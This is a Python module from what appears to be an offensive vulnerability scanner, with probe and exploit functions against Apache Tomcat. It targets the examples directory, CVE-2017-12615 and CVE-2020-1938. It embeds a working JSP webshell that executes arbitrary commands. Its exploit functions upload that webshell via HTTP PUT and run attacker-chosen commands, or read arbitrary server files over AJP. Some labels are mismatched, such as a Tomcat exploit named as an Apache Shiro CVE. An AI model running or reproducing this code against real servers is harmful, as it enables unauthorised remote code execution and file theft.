#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import socket
from thirdparty import requests
import threading
from module import globals
from core.verify import verify
from module.md5 import random_md5
from urllib.parse import urlparse
from thirdparty.requests_toolbelt.utils import dump
from thirdparty.ajpy.ajp import AjpResponse, AjpForwardRequest, AjpBodyRequest


class ApacheTomcat():
    def __init__(self, url):
        self.url = url
        if self.url[-1] == "/":
            self.url = self.url[:-1]
        self.raw_data = None
        self.vul_info = {}
        self.ua = globals.get_value("UA")  # 获取全局变量UA
        self.timeout = globals.get_value("TIMEOUT")  # 获取全局变量UA
        self.headers = globals.get_value("HEADERS")  # 获取全局变量HEADERS
        self.ceye_domain = globals.get_value("ceye_domain")
        self.ceye_token = globals.get_value("ceye_token")
        self.ceye_api = globals.get_value("ceye_api")
        self.threadLock = threading.Lock()
        self.getipport = urlparse(self.url)
        self.hostname = self.getipport.hostname
        self.port = self.getipport.port
        if self.port == None and r"https://" in self.url:
            self.port = 443
        elif self.port == None and r"http://" in self.url:
            self.port = 80
        # Do not use the payload:CVE-2017-12615 when checking
        # Use the payload:CVE-2017-12615 when exploiting
        # Because it is too harmful
        self.payload_cve_2017_12615 = '<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><' \
                                      '%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro =' \
                                      ' Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInpu' \
                                      'tStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\\n");}buf.cl' \
                                      'ose();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if("password".equ' \
                                      'als(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCm' \
                                      'd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>'

    def tomcat_examples_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Apache Tomcat: Examples File"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "/examples/servlets/servlet/SessionExample"
        self.vul_info["vul_name"] = "Apache Tomcat样例目录session操纵漏洞"
        self.vul_info["vul_numb"] = "null"
        self.vul_info["vul_apps"] = "Tomcat"
        self.vul_info["vul_date"] = "< 2015"
        self.vul_info["vul_vers"] = "all"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "远程代码执行"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Apache Tomcat默认安装包含”/examples”目录，里面存着众多的样例，" \
                                    "其中session样例(/examples/servlets/servlet/SessionExample)允许用户对session进行操纵。" \
                                    "因为session是全局通用的，所以用户可以通过操纵session获取管理员权限。"
        self.vul_info["cre_date"] = "2021-01-21"
        self.vul_info["cre_auth"] = "zhzyker"
        self.payload = "/examples/servlets/servlet/SessionExample"
        try:
            self.request = requests.get(self.url + self.payload, headers=self.headers, timeout=self.timeout, verify=False)
            if self.request.status_code == 200 and r"Session ID:" in self.request.text:
                self.vul_info["vul_data"] = dump.dump_all(self.request).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[url: " + self.url + self.payload + " ]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def cve_2017_12615_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Apache Tomcat: CVE-2017-12615"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "Apache Tomcat PUT 方法任意文件上传"
        self.vul_info["vul_numb"] = "CVE-2017-12615"
        self.vul_info["vul_apps"] = "Tomcat"
        self.vul_info["vul_date"] = "2017-09-20"
        self.vul_info["vul_vers"] = "7.0.0 - 7.0.81"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "任意文件上传"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Apache Tomcat如果开启PUT方法支持则可能存在远程代码执行漏洞，漏洞编号为CVE-2017-12615。" \
                                    "攻击者可以在使用该漏洞上传JSP文件,从而导致远程代码执行。"
        self.vul_info["cre_date"] = "2021-01-21"
        self.vul_info["cre_auth"] = "zhzyker"
        self.name = random_md5()
        key = random_md5()
        self.webshell = "/" + self.name + ".jsp/"
        self.payload1 = key
        self.payload2 = self.payload_cve_2017_12615
        try:
            self.request = requests.put(self.url + self.webshell, data=self.payload1, headers=self.headers,
                                        timeout=self.timeout, verify=False)
            self.request = requests.get(self.url + self.webshell[:-1], headers=self.headers, timeout=self.timeout,
                                        verify=False)
            if key in self.request.text:
                self.vul_info["vul_data"] = dump.dump_all(self.request).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["vul_payd"] = self.url + "/" + self.name + ".jsp"
                self.vul_info["prt_info"] = "[url: " + self.url + "/" + self.name + ".jsp ]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as e:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def cve_2017_12615_exp(self, cmd):
        vul_name = "Apache Tomcat: CVE-2017-12615"
        self.name = random_md5()
        self.webshell = "/" + self.name + ".jsp/"
        self.payload1 = self.name
        self.payload2 = self.payload_cve_2017_12615
        try:
            self.req = requests.put(self.url + self.webshell, data=self.payload2, headers=self.headers,
                                        timeout=self.timeout, verify=False)
            self.urlcmd = self.url + "/" + self.name + ".jsp?pwd=password&cmd=" + cmd
            self.request = requests.get(self.urlcmd, headers=self.headers, timeout=self.timeout, verify=False)
            self.r = "Put Webshell: " + self.urlcmd + "\n-------------------------\n" + self.request.text
            raw_data = dump.dump_all(self.req).decode('utf-8', 'ignore')
            verify.exploit_print(self.r, raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception as e:
            verify.error_print(vul_name)

    def cve_2020_1938_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Apache Tomcat: CVE-2020-1938"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "WEB-INF/web.xml"
        self.vul_info["vul_name"] = "Tomcat ajp13 协议任意文件读取"
        self.vul_info["vul_numb"] = "CVE-2020-1938"
        self.vul_info["vul_apps"] = "Tomcat"
        self.vul_info["vul_date"] = "2020-02-20"
        self.vul_info["vul_vers"] = "< 7.0.100, < 8.5.51, < 9.0.31"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "任意文件读取 "
        self.vul_info["vul_data"] = ">_< Tomcat cve-2020-2019 vulnerability uses AJP protocol detection\n" \
                                    ">_< So there is no HTTP protocol request and response"
        self.vul_info["vul_desc"] = "该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，" \
                                    "读取服务器webapp下的任意文件。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。"
        self.vul_info["cre_date"] = "2021-01-21"
        self.vul_info["cre_auth"] = "zhzyker"
        headers = self.headers
        self.output_method = "ajp"
        self.default_port = self.port
        self.default_requri = '/'
        self.default_headers = {}
        self.username = None
        self.password = None
        self.getipport = urlparse(self.url)
        self.hostname = self.getipport.hostname
        self.request = "null"
        self.default_file = "WEB-INF/web.xml"
        try:
            socket.setdefaulttimeout(self.timeout)
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.connect((self.hostname, self.default_port))
            self.stream = self.socket.makefile("rb", buffering=0)  # PY2: bufsize=0
            self.attributes = [
                {'name': 'req_attribute', 'value': ['javax.servlet.include.request_uri', '/']},
                {'name': 'req_attribute', 'value': ['javax.servlet.include.path_info', self.default_file]},
                {'name': 'req_attribute', 'value': ['javax.servlet.include.servlet_path', '/']},
            ]
            method = 'GET'
            self.forward_request = ApacheTomcat.__prepare_ajp_forward_request(self, self.hostname, self.default_requri,
                                                                              method=AjpForwardRequest.REQUEST_METHODS.get(
                                                                                  method))
            if self.username is not None and self.password is not None:
                self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic " + str(
                    ("%s:%s" % (self.username, self.password)).encode('base64').replace("\n" ""))
            for h in self.default_headers:
                self.forward_request.request_headers[h] = headers[h]
            for a in self.attributes:
                self.forward_request.attributes.append(a)
            self.responses = self.forward_request.send_and_receive(self.socket, self.stream)
            if len(self.responses) == 0:
                return None, None
            self.snd_hdrs_res = self.responses[0]
            self.data_res = self.responses[1:-1]
            self.request = (b"".join([d.data for d in self.data_res]).decode())
            if r"Welcome to Tomcat" in self.request and r"You may obtain a copy of the License at" in self.request:
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[ajp13] [port:" + str(self.default_port) + " file:" + self.default_file + "]"
            verify.scan_print(self.vul_info)
        except socket.timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except Exception as error:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def cve_2020_1938_exp(self, file):
        vul_name = "Apache Shiro: CVE-2016-4437"
        headers = self.headers
        self.output_method = "ajp"
        self.default_port = self.port
        self.default_requri = '/'
        self.default_headers = {}
        self.username = None
        self.password = None
        self.getipport = urlparse(self.url)
        self.hostname = self.getipport.hostname
        self.request = "null"
        raw_data = ">_< Tomcat cve-2020-2019 vulnerability uses AJP protocol detection\n" \
                   ">_< So there is no HTTP protocol request and response"
        try:
            socket.setdefaulttimeout(self.timeout)
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.connect((self.hostname, self.default_port))
            self.stream = self.socket.makefile("rb", buffering=0)  # PY2: bufsize=0
            self.attributes = [
                {'name': 'req_attribute', 'value': ['javax.servlet.include.request_uri', '/']},
                {'name': 'req_attribute', 'value': ['javax.servlet.include.path_info', file]},
                {'name': 'req_attribute', 'value': ['javax.servlet.include.servlet_path', '/']},
            ]
            method = 'GET'
            self.forward_request = ApacheTomcat.__prepare_ajp_forward_request(self, self.hostname, self.default_requri,
                                                                              method=AjpForwardRequest.REQUEST_METHODS.get(
                                                                                  method))
            if self.username is not None and self.password is not None:
                self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic " + str(
                    ("%s:%s" % (self.username, self.password)).encode('base64').replace("\n" ""))
            for h in self.default_headers:
                self.forward_request.request_headers[h] = headers[h]
            for a in self.attributes:
                self.forward_request.attributes.append(a)
            self.responses = self.forward_request.send_and_receive(self.socket, self.stream)
            if len(self.responses) == 0:
                return None, None
            self.snd_hdrs_res = self.responses[0]
            self.data_res = self.responses[1:-1]
            self.request = (b"".join([d.data for d in self.data_res]).decode())
            verify.exploit_print(self.request, raw_data)
        except socket.timeout:
            verify.timeout_print(vul_name)
        except Exception as error:
            verify.error_print(vul_name)

    # Apache Tomcat CVE-2020-1938 "AJP" protocol check def
    def __prepare_ajp_forward_request(self, target_host, req_uri, method=AjpForwardRequest.GET):
        self.fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)
        self.fr.method = method
        self.fr.protocol = "HTTP/1.1"
        self.fr.req_uri = req_uri
        self.fr.remote_addr = target_host
        self.fr.remote_host = None
        self.fr.server_name = target_host
        self.fr.server_port = 80
        self.fr.request_headers = {
            'SC_REQ_ACCEPT': 'text/html, application/xhtml+xml, application/xml;q=0.9, image/webp,*/*;q=0.8',
            'SC_REQ_CONNECTION': 'keep-alive',
            'SC_REQ_CONTENT_LENGTH': '0',
            'SC_REQ_HOST': target_host,
            'SC_REQ_USER_AGENT': 'Mozilla/5.0 (X11; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0',
            'Accept-Encoding': 'gzip, deflate, sdch',
            'Accept-Language': 'en-US, en;q=0.5',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        }
        self.fr.is_ssl = False
        self.fr.attributes = []
        return self.fr
